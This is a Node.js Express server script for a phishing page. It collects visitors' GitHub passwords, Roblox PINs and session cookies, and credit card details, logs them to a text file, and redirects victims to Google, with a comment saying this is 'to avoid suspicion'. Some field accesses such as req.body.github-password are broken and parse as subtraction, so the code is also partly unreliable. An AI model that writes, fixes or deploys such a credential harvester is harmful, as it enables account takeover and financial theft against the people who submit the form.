const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.post('/', (req, res) => {
  const username = req.body.username;
  const githubPassword = req.body.github-password;
  const robloxPin = req.body.roblox-pin;
  const robloxCookie = req.body.roblox-cookie;
  const creditCard = req.body.credit-card;

  // Log the information to a text file
  fs.appendFile('log.txt', `Username: ${username}\n`, (err) => {
    if (err) throw err;
  });
  fs.appendFile('log.txt', `GitHub Password: ${githubPassword}\n`, (err) => {
    if (err) throw err;
  });
  fs.appendFile('log.txt', `Roblox PIN: ${robloxPin}\n`, (err) => {
    if (err) throw err;
  });
  fs.appendFile('log.txt', `Roblox Cookies: ${robloxCookie}\n`, (err) => {
    if (err) throw err;
  });
  fs.appendFile('log.txt', `Credit Card Information: ${creditCard}\n`, (err) => {
    if (err) throw err;
  });

  // Redirect the user to a harmless page to avoid suspicion
  res.redirect('https://www.google.com/');
});

app.listen(3000, () => {
  console.log('Server running on port 3000');
});
